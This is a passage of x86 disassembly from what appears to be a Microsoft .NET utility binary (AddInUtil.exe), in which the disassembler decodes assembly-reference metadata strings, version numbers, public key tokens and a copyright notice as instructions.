  406611:	add    BYTE PTR [eax+eax*1],ch
  406614:	and    BYTE PTR [eax],al
  406616:	inc    ebx
  406617:	add    BYTE PTR [ebp+0x0],dh
  40661a:	ins    BYTE PTR es:[edi],dx
  40661b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40661f:	add    BYTE PTR [edx+0x0],dh
  406622:	add    BYTE PTR gs:0x65006e00,bh
  406629:	add    BYTE PTR [ebp+0x0],dh
  40662c:	je     0x40662e
  40662e:	jb     0x406630
  406630:	popa   
  406631:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406635:	add    BYTE PTR [eax],ah
  406637:	add    BYTE PTR [eax+0x0],dl
  40663a:	jne    0x40663c
  40663c:	bound  eax,QWORD PTR [eax]
  40663e:	ins    BYTE PTR es:[edi],dx
  40663f:	add    BYTE PTR [ecx+0x0],ch
  406642:	arpl   WORD PTR [eax],ax
  406644:	dec    ebx
  406645:	add    BYTE PTR [ebp+0x0],ah
  406648:	jns    0x40664a
  40664a:	push   esp
  40664b:	add    BYTE PTR [edi+0x0],ch
  40664e:	imul   eax,DWORD PTR [eax],0x65
  406651:	add    BYTE PTR [esi+0x0],ch
  406654:	cmp    eax,0x30006200
  406659:	add    BYTE PTR [ebx],dh
  40665b:	add    BYTE PTR [esi+0x0],ah
  40665e:	xor    eax,0x37006600
  406663:	add    BYTE PTR [esi+0x0],ah
  406666:	xor    DWORD PTR [eax],eax
  406668:	xor    DWORD PTR [eax],eax
  40666a:	add    BYTE PTR fs:0x61003000,dh
  406671:	add    BYTE PTR [ebx],dh
  406673:	add    BYTE PTR [ecx+0x0],ah
  406676:	and    BYTE PTR [edx+0x0],ah
  406679:	aaa    
  40667a:	add    BYTE PTR [edx+0x0],ah
  40667d:	add    BYTE PTR fs:[edi],dh
  406680:	add    BYTE PTR [esi],dh
  406682:	add    BYTE PTR [edi],dh
  406684:	add    BYTE PTR [eax],bh
  406686:	add    BYTE PTR [edx+0x0],ah
  406689:	cmp    DWORD PTR [eax],eax
  40668b:	aaa    
  40668c:	add    BYTE PTR [edi],dh
  40668e:	add    BYTE PTR [edx+0x0],ah
  406691:	add    BYTE PTR fs:[eax],bh
  406694:	add    BYTE PTR [esi+0x0],ah
  406697:	xor    BYTE PTR [edx+0x530041],0x50
  40669e:	add    BYTE PTR [esi],ch
  4066a0:	add    BYTE PTR [edx+0x0],al
  4066a3:	jb     0x4066a5
  4066a5:	outs   dx,DWORD PTR ds:[esi]
  4066a6:	add    BYTE PTR [edi+0x0],dh
  4066a9:	jae    0x4066ab
  4066ab:	add    BYTE PTR gs:[edx+0x0],dh
  4066af:	inc    ebx
  4066b0:	add    BYTE PTR [ecx+0x0],ah
  4066b3:	jo     0x4066b5
  4066b5:	jae    0x4066b7
  4066b7:	inc    esi
  4066b8:	add    BYTE PTR [ecx+0x0],ah
  4066bb:	arpl   WORD PTR [eax],ax
  4066bd:	je     0x4066bf
  4066bf:	outs   dx,DWORD PTR ds:[esi]
  4066c0:	add    BYTE PTR [edx+0x0],dh
  4066c3:	jns    0x4066c5
  4066c5:	sub    al,0x0
  4066c7:	and    BYTE PTR [eax],al
  4066c9:	push   esi
  4066ca:	add    BYTE PTR [ebp+0x0],ah
  4066cd:	jb     0x4066cf
  4066cf:	jae    0x4066d1
  4066d1:	imul   eax,DWORD PTR [eax],0x6e006f
  4066d7:	cmp    eax,0x2e003400
  4066dc:	add    BYTE PTR [eax],dh
  4066de:	add    BYTE PTR [esi],ch
  4066e0:	add    BYTE PTR [eax],dh
  4066e2:	add    BYTE PTR [esi],ch
  4066e4:	add    BYTE PTR [eax],dh
  4066e6:	add    BYTE PTR [eax+eax*1],ch
  4066e9:	and    BYTE PTR [eax],al
  4066eb:	inc    ebx
  4066ec:	add    BYTE PTR [ebp+0x0],dh
  4066ef:	ins    BYTE PTR es:[edi],dx
  4066f0:	add    BYTE PTR [eax+eax*1+0x75],dh
  4066f4:	add    BYTE PTR [edx+0x0],dh
  4066f7:	add    BYTE PTR gs:0x65006e00,bh
  4066fe:	add    BYTE PTR [ebp+0x0],dh
  406701:	je     0x406703
  406703:	jb     0x406705
  406705:	popa   
  406706:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40670a:	add    BYTE PTR [eax],ah
  40670c:	add    BYTE PTR [eax+0x0],dl
  40670f:	jne    0x406711
  406711:	bound  eax,QWORD PTR [eax]
  406713:	ins    BYTE PTR es:[edi],dx
  406714:	add    BYTE PTR [ecx+0x0],ch
  406717:	arpl   WORD PTR [eax],ax
  406719:	dec    ebx
  40671a:	add    BYTE PTR [ebp+0x0],ah
  40671d:	jns    0x40671f
  40671f:	push   esp
  406720:	add    BYTE PTR [edi+0x0],ch
  406723:	imul   eax,DWORD PTR [eax],0x65
  406726:	add    BYTE PTR [esi+0x0],ch
  406729:	cmp    eax,0x37006200
  40672e:	add    BYTE PTR [edx+0x0],ah
  406731:	add    BYTE PTR fs:[edi],dh
  406734:	add    BYTE PTR [esi],dh
  406736:	add    BYTE PTR [edi],dh
  406738:	add    BYTE PTR [eax],bh
  40673a:	add    BYTE PTR [edx+0x0],ah
  40673d:	cmp    DWORD PTR [eax],eax
  40673f:	aaa    
  406740:	add    BYTE PTR [edi],dh
  406742:	add    BYTE PTR [edx+0x0],ah
  406745:	add    BYTE PTR fs:[eax],bh
  406748:	add    BYTE PTR [esi+0x0],ah
  40674b:	xor    BYTE PTR [eax+0x69004d],0x63
  406752:	add    BYTE PTR [edx+0x0],dh
  406755:	outs   dx,DWORD PTR ds:[esi]
  406756:	add    BYTE PTR [ebx+0x0],dh
  406759:	outs   dx,DWORD PTR ds:[esi]
  40675a:	add    BYTE PTR [esi+0x0],ah
  40675d:	je     0x40675f
  40675f:	add    BYTE PTR cs:[esi+0x0],dl
  406763:	push   ebx
  406764:	add    BYTE PTR [eax+eax*1+0x65],al
  406768:	add    BYTE PTR [ebx+0x0],dh
  40676b:	imul   eax,DWORD PTR [eax],0x6e0067
  406771:	add    BYTE PTR gs:[edx+0x0],dh
  406775:	sub    al,0x0
  406777:	and    BYTE PTR [eax],al
  406779:	push   esi
  40677a:	add    BYTE PTR [ebp+0x0],ah
  40677d:	jb     0x40677f
  40677f:	jae    0x406781
  406781:	imul   eax,DWORD PTR [eax],0x6e006f
  406787:	cmp    eax,0x30003100
  40678c:	add    BYTE PTR [esi],ch
  40678e:	add    BYTE PTR [eax],dh
  406790:	add    BYTE PTR [esi],ch
  406792:	add    BYTE PTR [eax],dh
  406794:	add    BYTE PTR [esi],ch
  406796:	add    BYTE PTR [eax],dh
  406798:	add    BYTE PTR [eax+eax*1],ch
  40679b:	and    BYTE PTR [eax],al
  40679d:	inc    ebx
  40679e:	add    BYTE PTR [ebp+0x0],dh
  4067a1:	ins    BYTE PTR es:[edi],dx
  4067a2:	add    BYTE PTR [eax+eax*1+0x75],dh
  4067a6:	add    BYTE PTR [edx+0x0],dh
  4067a9:	add    BYTE PTR gs:0x65006e00,bh
  4067b0:	add    BYTE PTR [ebp+0x0],dh
  4067b3:	je     0x4067b5
  4067b5:	jb     0x4067b7
  4067b7:	popa   
  4067b8:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4067bc:	add    BYTE PTR [eax],ah
  4067be:	add    BYTE PTR [eax+0x0],dl
  4067c1:	jne    0x4067c3
  4067c3:	bound  eax,QWORD PTR [eax]
  4067c5:	ins    BYTE PTR es:[edi],dx
  4067c6:	add    BYTE PTR [ecx+0x0],ch
  4067c9:	arpl   WORD PTR [eax],ax
  4067cb:	dec    ebx
  4067cc:	add    BYTE PTR [ebp+0x0],ah
  4067cf:	jns    0x4067d1
  4067d1:	push   esp
  4067d2:	add    BYTE PTR [edi+0x0],ch
  4067d5:	imul   eax,DWORD PTR [eax],0x65
  4067d8:	add    BYTE PTR [esi+0x0],ch
  4067db:	cmp    eax,0x30006200
  4067e0:	add    BYTE PTR [ebx],dh
  4067e2:	add    BYTE PTR [esi+0x0],ah
  4067e5:	xor    eax,0x37006600
  4067ea:	add    BYTE PTR [esi+0x0],ah
  4067ed:	xor    DWORD PTR [eax],eax
  4067ef:	xor    DWORD PTR [eax],eax
  4067f1:	add    BYTE PTR fs:0x61003000,dh
  4067f8:	add    BYTE PTR [ebx],dh
  4067fa:	add    BYTE PTR [ecx+0x0],ah
  4067fd:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  406805:	jb     0x406807
  406807:	outs   dx,DWORD PTR ds:[esi]
  406808:	add    BYTE PTR [ebx+0x0],dh
  40680b:	outs   dx,DWORD PTR ds:[esi]
  40680c:	add    BYTE PTR [esi+0x0],ah
  40680f:	je     0x406811
  406811:	add    BYTE PTR cs:[esi+0x0],dl
  406815:	imul   eax,DWORD PTR [eax],0x750073
  40681b:	popa   
  40681c:	add    BYTE PTR [eax+eax*1+0x53],ch
  406820:	add    BYTE PTR [eax+eax*1+0x75],dh
  406824:	add    BYTE PTR [eax+eax*1+0x69],ah
  406828:	add    BYTE PTR [edi+0x0],ch
  40682b:	add    BYTE PTR cs:[edi+0x0],dl
  40682f:	add    BYTE PTR gs:[edx+0x0],ah
  406833:	sub    al,0x0
  406835:	and    BYTE PTR [eax],al
  406837:	push   esi
  406838:	add    BYTE PTR [ebp+0x0],ah
  40683b:	jb     0x40683d
  40683d:	jae    0x40683f
  40683f:	imul   eax,DWORD PTR [eax],0x6e006f
  406845:	cmp    eax,0x30003100
  40684a:	add    BYTE PTR [esi],ch
  40684c:	add    BYTE PTR [eax],dh
  40684e:	add    BYTE PTR [esi],ch
  406850:	add    BYTE PTR [eax],dh
  406852:	add    BYTE PTR [esi],ch
  406854:	add    BYTE PTR [eax],dh
  406856:	add    BYTE PTR [eax+eax*1],ch
  406859:	and    BYTE PTR [eax],al
  40685b:	inc    ebx
  40685c:	add    BYTE PTR [ebp+0x0],dh
  40685f:	ins    BYTE PTR es:[edi],dx
  406860:	add    BYTE PTR [eax+eax*1+0x75],dh
  406864:	add    BYTE PTR [edx+0x0],dh
  406867:	add    BYTE PTR gs:0x65006e00,bh
  40686e:	add    BYTE PTR [ebp+0x0],dh
  406871:	je     0x406873
  406873:	jb     0x406875
  406875:	popa   
  406876:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40687a:	add    BYTE PTR [eax],ah
  40687c:	add    BYTE PTR [eax+0x0],dl
  40687f:	jne    0x406881
  406881:	bound  eax,QWORD PTR [eax]
  406883:	ins    BYTE PTR es:[edi],dx
  406884:	add    BYTE PTR [ecx+0x0],ch
  406887:	arpl   WORD PTR [eax],ax
  406889:	dec    ebx
  40688a:	add    BYTE PTR [ebp+0x0],ah
  40688d:	jns    0x40688f
  40688f:	push   esp
  406890:	add    BYTE PTR [edi+0x0],ch
  406893:	imul   eax,DWORD PTR [eax],0x65
  406896:	add    BYTE PTR [esi+0x0],ch
  406899:	cmp    eax,0x30006200
  40689e:	add    BYTE PTR [ebx],dh
  4068a0:	add    BYTE PTR [esi+0x0],ah
  4068a3:	xor    eax,0x37006600
  4068a8:	add    BYTE PTR [esi+0x0],ah
  4068ab:	xor    DWORD PTR [eax],eax
  4068ad:	xor    DWORD PTR [eax],eax
  4068af:	add    BYTE PTR fs:0x61003000,dh
  4068b6:	add    BYTE PTR [ebx],dh
  4068b8:	add    BYTE PTR [ecx+0x0],ah
  4068bb:	cmp    BYTE PTR [esi+0x69004d],0x63
  4068c2:	add    BYTE PTR [edx+0x0],dh
  4068c5:	outs   dx,DWORD PTR ds:[esi]
  4068c6:	add    BYTE PTR [ebx+0x0],dh
  4068c9:	outs   dx,DWORD PTR ds:[esi]
  4068ca:	add    BYTE PTR [esi+0x0],ah
  4068cd:	je     0x4068cf
  4068cf:	add    BYTE PTR cs:[edi+0x0],dl
  4068d3:	add    BYTE PTR gs:[edx+0x0],ah
  4068d7:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  4068dc:	add    BYTE PTR [ebx+0x0],dh
  4068df:	imul   eax,DWORD PTR [eax],0x6e0067
  4068e5:	add    BYTE PTR cs:[ebx+0x0],al
  4068e9:	ins    BYTE PTR es:[edi],dx
  4068ea:	add    BYTE PTR [ecx+0x0],ch
  4068ed:	add    BYTE PTR gs:[esi+0x0],ch
  4068f1:	je     0x4068f3
  4068f3:	sub    al,0x0
  4068f5:	and    BYTE PTR [eax],al
  4068f7:	push   esi
  4068f8:	add    BYTE PTR [ebp+0x0],ah
  4068fb:	jb     0x4068fd
  4068fd:	jae    0x4068ff
  4068ff:	imul   eax,DWORD PTR [eax],0x6e006f
  406905:	cmp    eax,0x30003100
  40690a:	add    BYTE PTR [esi],ch
  40690c:	add    BYTE PTR [eax],dh
  40690e:	add    BYTE PTR [esi],ch
  406910:	add    BYTE PTR [eax],dh
  406912:	add    BYTE PTR [esi],ch
  406914:	add    BYTE PTR [eax],dh
  406916:	add    BYTE PTR [eax+eax*1],ch
  406919:	and    BYTE PTR [eax],al
  40691b:	inc    ebx
  40691c:	add    BYTE PTR [ebp+0x0],dh
  40691f:	ins    BYTE PTR es:[edi],dx
  406920:	add    BYTE PTR [eax+eax*1+0x75],dh
  406924:	add    BYTE PTR [edx+0x0],dh
  406927:	add    BYTE PTR gs:0x65006e00,bh
  40692e:	add    BYTE PTR [ebp+0x0],dh
  406931:	je     0x406933
  406933:	jb     0x406935
  406935:	popa   
  406936:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40693a:	add    BYTE PTR [eax],ah
  40693c:	add    BYTE PTR [eax+0x0],dl
  40693f:	jne    0x406941
  406941:	bound  eax,QWORD PTR [eax]
  406943:	ins    BYTE PTR es:[edi],dx
  406944:	add    BYTE PTR [ecx+0x0],ch
  406947:	arpl   WORD PTR [eax],ax
  406949:	dec    ebx
  40694a:	add    BYTE PTR [ebp+0x0],ah
  40694d:	jns    0x40694f
  40694f:	push   esp
  406950:	add    BYTE PTR [edi+0x0],ch
  406953:	imul   eax,DWORD PTR [eax],0x65
  406956:	add    BYTE PTR [esi+0x0],ch
  406959:	cmp    eax,0x30006200
  40695e:	add    BYTE PTR [ebx],dh
  406960:	add    BYTE PTR [esi+0x0],ah
  406963:	xor    eax,0x37006600
  406968:	add    BYTE PTR [esi+0x0],ah
  40696b:	xor    DWORD PTR [eax],eax
  40696d:	xor    DWORD PTR [eax],eax
  40696f:	add    BYTE PTR fs:0x61003000,dh
  406976:	add    BYTE PTR [ebx],dh
  406978:	add    BYTE PTR [ecx+0x0],ah
  40697b:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  406983:	jb     0x406985
  406985:	outs   dx,DWORD PTR ds:[esi]
  406986:	add    BYTE PTR [ebx+0x0],dh
  406989:	outs   dx,DWORD PTR ds:[esi]
  40698a:	add    BYTE PTR [esi+0x0],ah
  40698d:	je     0x40698f
  40698f:	add    BYTE PTR cs:[esi+0x0],dl
  406993:	push   ebx
  406994:	add    BYTE PTR [eax+eax*1+0x65],al
  406998:	add    BYTE PTR [ebx+0x0],dh
  40699b:	imul   eax,DWORD PTR [eax],0x6e0067
  4069a1:	add    BYTE PTR gs:[edx+0x0],dh
  4069a5:	add    BYTE PTR cs:[ebp+0x0],cl
  4069a9:	outs   dx,DWORD PTR ds:[esi]
  4069aa:	add    BYTE PTR [edx+0x0],ah
  4069ad:	imul   eax,DWORD PTR [eax],0x65006c
  4069b3:	sub    al,0x0
  4069b5:	and    BYTE PTR [eax],al
  4069b7:	push   esi
  4069b8:	add    BYTE PTR [ebp+0x0],ah
  4069bb:	jb     0x4069bd
  4069bd:	jae    0x4069bf
  4069bf:	imul   eax,DWORD PTR [eax],0x6e006f
  4069c5:	cmp    eax,0x2e003800
  4069ca:	add    BYTE PTR [eax],dh
  4069cc:	add    BYTE PTR [esi],ch
  4069ce:	add    BYTE PTR [eax],dh
  4069d0:	add    BYTE PTR [esi],ch
  4069d2:	add    BYTE PTR [eax],dh
  4069d4:	add    BYTE PTR [eax+eax*1],ch
  4069d7:	and    BYTE PTR [eax],al
  4069d9:	inc    ebx
  4069da:	add    BYTE PTR [ebp+0x0],dh
  4069dd:	ins    BYTE PTR es:[edi],dx
  4069de:	add    BYTE PTR [eax+eax*1+0x75],dh
  4069e2:	add    BYTE PTR [edx+0x0],dh
  4069e5:	add    BYTE PTR gs:0x65006e00,bh
  4069ec:	add    BYTE PTR [ebp+0x0],dh
  4069ef:	je     0x4069f1
  4069f1:	jb     0x4069f3
  4069f3:	popa   
  4069f4:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4069f8:	add    BYTE PTR [eax],ah
  4069fa:	add    BYTE PTR [eax+0x0],dl
  4069fd:	jne    0x4069ff
  4069ff:	bound  eax,QWORD PTR [eax]
  406a01:	ins    BYTE PTR es:[edi],dx
  406a02:	add    BYTE PTR [ecx+0x0],ch
  406a05:	arpl   WORD PTR [eax],ax
  406a07:	dec    ebx
  406a08:	add    BYTE PTR [ebp+0x0],ah
  406a0b:	jns    0x406a0d
  406a0d:	push   esp
  406a0e:	add    BYTE PTR [edi+0x0],ch
  406a11:	imul   eax,DWORD PTR [eax],0x65
  406a14:	add    BYTE PTR [esi+0x0],ch
  406a17:	cmp    eax,0x30006200
  406a1c:	add    BYTE PTR [ebx],dh
  406a1e:	add    BYTE PTR [esi+0x0],ah
  406a21:	xor    eax,0x37006600
  406a26:	add    BYTE PTR [esi+0x0],ah
  406a29:	xor    DWORD PTR [eax],eax
  406a2b:	xor    DWORD PTR [eax],eax
  406a2d:	add    BYTE PTR fs:0x61003000,dh
  406a34:	add    BYTE PTR [ebx],dh
  406a36:	add    BYTE PTR [ecx+0x0],ah
  406a39:	sub    BYTE PTR [eax+0x69004d],0x63
  406a40:	add    BYTE PTR [edx+0x0],dh
  406a43:	outs   dx,DWORD PTR ds:[esi]
  406a44:	add    BYTE PTR [ebx+0x0],dh
  406a47:	outs   dx,DWORD PTR ds:[esi]
  406a48:	add    BYTE PTR [esi+0x0],ah
  406a4b:	je     0x406a4d
  406a4d:	add    BYTE PTR cs:[edx+0x0],cl
  406a51:	push   ebx
  406a52:	add    BYTE PTR [ebx+0x0],ah
  406a55:	jb     0x406a57
  406a57:	imul   eax,DWORD PTR [eax],0x740070
  406a5d:	sub    al,0x0
  406a5f:	and    BYTE PTR [eax],al
  406a61:	push   esi
  406a62:	add    BYTE PTR [ebp+0x0],ah
  406a65:	jb     0x406a67
  406a67:	jae    0x406a69
  406a69:	imul   eax,DWORD PTR [eax],0x6e006f
  406a6f:	cmp    eax,0x2e003800
  406a74:	add    BYTE PTR [eax],dh
  406a76:	add    BYTE PTR [esi],ch
  406a78:	add    BYTE PTR [eax],dh
  406a7a:	add    BYTE PTR [esi],ch
  406a7c:	add    BYTE PTR [eax],dh
  406a7e:	add    BYTE PTR [eax+eax*1],ch
  406a81:	and    BYTE PTR [eax],al
  406a83:	inc    ebx
  406a84:	add    BYTE PTR [ebp+0x0],dh
  406a87:	ins    BYTE PTR es:[edi],dx
  406a88:	add    BYTE PTR [eax+eax*1+0x75],dh
  406a8c:	add    BYTE PTR [edx+0x0],dh
  406a8f:	add    BYTE PTR gs:0x65006e00,bh
  406a96:	add    BYTE PTR [ebp+0x0],dh
  406a99:	je     0x406a9b
  406a9b:	jb     0x406a9d
  406a9d:	popa   
  406a9e:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406aa2:	add    BYTE PTR [eax],ah
  406aa4:	add    BYTE PTR [eax+0x0],dl
  406aa7:	jne    0x406aa9
  406aa9:	bound  eax,QWORD PTR [eax]
  406aab:	ins    BYTE PTR es:[edi],dx
  406aac:	add    BYTE PTR [ecx+0x0],ch
  406aaf:	arpl   WORD PTR [eax],ax
  406ab1:	dec    ebx
  406ab2:	add    BYTE PTR [ebp+0x0],ah
  406ab5:	jns    0x406ab7
  406ab7:	push   esp
  406ab8:	add    BYTE PTR [edi+0x0],ch
  406abb:	imul   eax,DWORD PTR [eax],0x65
  406abe:	add    BYTE PTR [esi+0x0],ch
  406ac1:	cmp    eax,0x30006200
  406ac6:	add    BYTE PTR [ebx],dh
  406ac8:	add    BYTE PTR [esi+0x0],ah
  406acb:	xor    eax,0x37006600
  406ad0:	add    BYTE PTR [esi+0x0],ah
  406ad3:	xor    DWORD PTR [eax],eax
  406ad5:	xor    DWORD PTR [eax],eax
  406ad7:	add    BYTE PTR fs:0x61003000,dh
  406ade:	add    BYTE PTR [ebx],dh
  406ae0:	add    BYTE PTR [ecx+0x0],ah
  406ae3:	add    al,BYTE PTR [esi]
  406ae5:	push   cs
  406ae6:	add    al,BYTE PTR [esi]
  406ae8:	or     BYTE PTR [ebx],al
  406aea:	push   es
  406aeb:	adc    bh,BYTE PTR [ebp+0x4]
  406aee:	push   es
  406aef:	adc    al,BYTE PTR [eax+0x381]
  406af5:	add    DWORD PTR ds:0x1d080100,eax
  406afb:	push   cs
  406afc:	add    al,0x0
  406afe:	add    BYTE PTR [edx],dl
  406b00:	jge    0x406b08
  406b02:	add    BYTE PTR [ecx],al
  406b04:	add    DWORD PTR [edx],edx
  406b06:	add    BYTE PTR [ecx+0xe000003],0x4
  406b0d:	or     BYTE PTR [eax],al
  406b0f:	adc    bh,BYTE PTR [ebp+0x5]
  406b12:	or     BYTE PTR [eax],al
  406b14:	adc    al,BYTE PTR [eax+0x80381]
  406b1a:	push   cs
  406b1b:	or     BYTE PTR [ecx],al
  406b1d:	add    BYTE PTR [eax],cl
  406b1f:	add    BYTE PTR [eax],al
  406b21:	add    BYTE PTR [eax],al
  406b23:	add    BYTE PTR [eax],cl
  406b25:	add    DWORD PTR [eax],eax
  406b27:	add    al,BYTE PTR [eax]
  406b29:	add    BYTE PTR [eax],al
  406b2b:	add    BYTE PTR [eax],al
  406b2d:	add    eax,0x1
  406b32:	add    BYTE PTR ds:0x10001,al
  406b38:	add    BYTE PTR [edx],dl
  406b3a:	add    DWORD PTR [eax],eax
  406b3c:	or     eax,0x49646441
  406b41:	outs   dx,BYTE PTR ds:[esi]
  406b42:	push   ebp
  406b43:	je     0x406bae
  406b45:	ins    BYTE PTR es:[edi],dx
  406b46:	cs gs js 0x406baf
  406b4a:	add    BYTE PTR [eax],al
  406b4c:	sbb    al,BYTE PTR [ecx]
  406b4e:	add    BYTE PTR ds:0x7263694d,dl
  406b54:	outs   dx,DWORD PTR ds:[esi]
  406b55:	jae    0x406bc6
  406b57:	data16 je 0x406b7a
  406b5a:	inc    ebx
  406b5b:	outs   dx,DWORD PTR ds:[esi]
  406b5c:	jb     0x406bce
  406b5e:	outs   dx,DWORD PTR ds:[esi]
  406b5f:	jb     0x406bc2
  406b61:	je     0x406bcc
  406b63:	outs   dx,DWORD PTR ds:[esi]
  406b64:	outs   dx,BYTE PTR ds:[esi]
  406b65:	add    BYTE PTR [eax],al
  406b67:	pop    ds
  406b68:	add    DWORD PTR [eax],eax
  406b6a:	sbb    cl,BYTE PTR [ebp+0x69]
  406b6d:	arpl   WORD PTR [edx+0x6f],si
  406b70:	jae    0x406be1
  406b72:	data16 je 0x406b37
  406b75:	scas   al,BYTE PTR es:[edi]
  406b76:	and    BYTE PTR [esi],ch
  406b78:	dec    esi
  406b79:	inc    ebp
  406b7a:	push   esp
  406b7b:	and    BYTE PTR [esi+0x72],al
  406b7e:	popa   
  406b7f:	ins    DWORD PTR es:[edi],dx
  406b80:	gs ja  0x406bf2
  406b83:	jb     0x406bf0
  406b85:	add    BYTE PTR [eax],al
  406b87:	xor    al,0x1
  406b89:	add    BYTE PTR [edi],ch
  406b8b:	ret    0x20a9
  406b8e:	dec    ebp
  406b8f:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  406b96:	je     0x406bb8
  406b98:	inc    ebx
  406b99:	outs   dx,DWORD PTR ds:[esi]
  406b9a:	jb     0x406c0c
  406b9c:	outs   dx,DWORD PTR ds:[esi]
  406b9d:	jb     0x406c00
  406b9f:	je     0x406c0a
  406ba1:	outs   dx,DWORD PTR ds:[esi]
  406ba2:	outs   dx,BYTE PTR ds:[esi]
  406ba3:	and    BYTE PTR cs:[eax],ah
  406ba6:	inc    ecx
  406ba7:	ins    BYTE PTR es:[edi],dx
  406ba8:	ins    BYTE PTR es:[edi],dx
  406ba9:	and    BYTE PTR [edx+0x69],dh
  406bac:	addr16 push 0x72207374
  406bb2:	gs jae 0x406c1a
  406bb5:	jb     0x406c2d
  406bb7:	gs fs add BYTE PTR cs:[eax],al
  406bbc:	or     eax,0x34080001
  406bc1:	cs ss cs aaa 
  406bc5:	cmp    DWORD PTR [esi],ebp
  406bc7:	xor    BYTE PTR [eax],al
  406bc9:	add    BYTE PTR [ecx+eax*1],cl
  406bcc:	add    BYTE PTR [edi],al
  406bce:	xor    al,0x2e
  406bd0:	xor    BYTE PTR [esi],ch
  406bd2:	xor    BYTE PTR [esi],ch
  406bd4:	xor    BYTE PTR [eax],al
  406bd6:	add    BYTE PTR [edx],cl
  406bd8:	add    DWORD PTR [eax],eax
  406bda:	add    eax,0x552d6e65
  406bdf:	push   ebx
  406be0:	add    BYTE PTR [eax],al
  406be2:	sub    DWORD PTR [ecx],eax
  406be4:	add    BYTE PTR [esi+eiz*2],ah
  406be7:	cmp    bl,BYTE PTR [esp+eiz*2+0x64]
  406beb:	pop    esp
  406bec:	je     0x406c5d
  406bee:	outs   dx,DWORD PTR ds:[esi]
  406bef:	ins    BYTE PTR es:[edi],dx
  406bf0:	jae    0x406c4e
  406bf2:	fs gs jbe 0x406c5a
  406bf6:	imul   esi,DWORD PTR [esi+0x5c],0x616d6345
  406bfd:	push   eax
  406bfe:	jne    0x406c62
  406c00:	ins    BYTE PTR es:[edi],dx
  406c01:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  406c08:	outs   dx,BYTE PTR ds:[esi]
  406c09:	imul   eax,DWORD PTR [eax],0x0
  406c0c:	or     DWORD PTR [eax+0x1],0x0
  406c10:	add    BYTE PTR [eax+0x30],0x30
  406c14:	xor    dh,BYTE PTR [eax+esi*1]
  406c17:	xor    BYTE PTR [eax],dh
  406c19:	xor    BYTE PTR [eax],dh
  406c1b:	arpl   WORD PTR [eax],di
  406c1d:	xor    BYTE PTR [eax],dh
  406c1f:	xor    BYTE PTR [eax],dh
  406c21:	xor    BYTE PTR [ecx],dh
  406c23:	xor    al,0x30
  406c25:	xor    DWORD PTR [eax],esi
  406c27:	xor    BYTE PTR [eax],dh
  406c29:	xor    BYTE PTR [eax],dh
  406c2b:	xor    BYTE PTR ss:[edx],dh
  406c2e:	xor    BYTE PTR [eax],dh
  406c30:	xor    BYTE PTR [eax],dh
  406c32:	xor    BYTE PTR [eax],dh
  406c34:	xor    dh,BYTE PTR [eax+esi*1]
  406c37:	xor    BYTE PTR [eax],dh
  406c39:	xor    BYTE PTR ds:0x34333532,dh
  406c3f:	xor    DWORD PTR [ebx],esi
  406c41:	xor    DWORD PTR [eax],esi
  406c43:	xor    BYTE PTR [eax],dh
  406c45:	cmp    BYTE PTR [eax],dh
  406c47:	xor    BYTE PTR [eax],dh
  406c49:	xor    BYTE PTR [eax],dh
  406c4b:	xor    DWORD PTR [eax],esi
  406c4d:	xor    BYTE PTR [eax],dh
  406c4f:	xor    DWORD PTR [eax],esi
  406c51:	xor    BYTE PTR [esi],dh
  406c53:	xor    DWORD PTR [ebx],esi
  406c55:	xor    edi,DWORD PTR [ecx]
  406c57:	cmp    DWORD PTR [ecx+0x66],esp
  406c5a:	xor    WORD PTR [eax],di
  406c5d:	xor    WORD PTR gs:[ecx+0x32],sp
  406c62:	arpl   WORD PTR [edx],si
  406c64:	xor    eax,0x32613431
  406c69:	aaa    
  406c6a:	xor    esp,DWORD PTR [ecx+0x34]
  406c6d:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  406c71:	xor    al,0x32
  406c73:	bound  esi,QWORD PTR [edi]
  406c75:	xor    dh,BYTE PTR [ebx]
  406c77:	xor    dh,BYTE PTR [ecx]
  406c79:	xor    WORD PTR [edi],si
  406c7c:	xor    eax,0x32303137
  406c81:	cmp    WORD PTR fs:[ebp+0x62],sp
  406c86:	popa   
  406c87:	fs popa 
  406c89:	cmp    DWORD PTR ss:[ecx],edi
  406c8c:	xor    dh,BYTE PTR [ebx]
  406c8e:	xor    dh,BYTE PTR gs:[edi]
  406c91:	xor    edi,DWORD PTR [eax]
  406c93:	xor    al,0x30
  406c95:	arpl   WORD PTR ss:[edx],si
  406c98:	xor    DWORD PTR [ebp+0x35],esp
  406c9b:	bound  edi,QWORD PTR [eax]
  406c9d:	xor    BYTE PTR [ecx],dh
  406c9f:	xor    eax,0x62613235
  406ca4:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  406ca8:	xor    BYTE PTR [ecx+0x36],ah
  406cab:	xor    eax,0x35333261
  406cb0:	xor    BYTE PTR gs:[eax],dh
  406cb3:	xor    DWORD PTR [ecx+0x63],esp
  406cb6:	cmp    DWORD PTR [ecx+0x64],esp
  406cb9:	arpl   WORD PTR [edx],si
  406cbb:	xor    eax,0x38643266
  406cc0:	xor    DWORD PTR [ecx],esi
  406cc2:	bound  esi,QWORD PTR gs:[eax]
  406cc5:	cmp    DWORD PTR [ecx+edi*1],esi
  406cc8:	ss popa 
  406cca:	xor    al,0x63
  406ccc:	ss popa 
  406cce:	xor    eax,0x36346439
  406cd3:	xor    DWORD PTR [ecx],edi
  406cd5:	xor    eax,0x36633938
  406cda:	cmp    DWORD PTR [esi+0x35],esp
  406cdd:	bound  esp,QWORD PTR [ecx+0x66]
  406ce0:	xor    BYTE PTR [ebx+0x34],ah
  406ce3:	xor    DWORD PTR [edi],esi
  406ce5:	cmp    DWORD PTR [ecx+0x34],esp
  406ce8:	aaa    
  406ce9:	xor    esi,DWORD PTR [ecx]
  406ceb:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  406cef:	xor    eax,0x64633535
